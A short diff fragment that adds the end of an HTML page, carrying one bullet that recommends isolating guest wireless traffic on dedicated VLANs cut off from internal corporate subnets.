+<p>   * Isolate guest wireless traffic onto dedicated VLANs with zero access to internal corporate subnets.</p>
+</body>
+</html>
